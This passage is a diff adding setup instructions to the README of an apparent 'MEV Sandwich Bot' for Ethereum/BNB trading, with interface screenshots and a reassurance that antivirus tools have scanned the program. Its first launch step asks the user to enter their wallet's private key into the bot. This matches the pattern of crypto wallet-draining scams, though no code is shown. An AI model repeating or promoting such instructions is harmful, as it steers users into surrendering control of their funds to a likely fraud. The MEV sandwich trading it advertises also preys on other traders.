@@ -117,3 +117,31 @@ The program has been scanned for security using antivirus tools. Below is a scre
 
   
 
+# 🛠️ M.E.V Sandwich Bot Setup and Launch Guide
+
+  
+
+<p  align="center">
+
+<img  src="https://i.ibb.co/KLF9Z37/Interface.png"  alt="MEV Sandwich Bot Interface">
+
+</p>
+
+  
+
+---
+
+  
+
+## 🔥 Steps to Launch the Bot
+
+  
+
+1.  **Enter your ERC-20 p.key** for your address (Ethereum or BNB). <p  align="center">
+
+<img  src="https://i.ibb.co/bFVpvv2/PrKey.png"  alt="MEV Sandwich Bot Interface"  width="300">
+
+</p>
+
+  
+
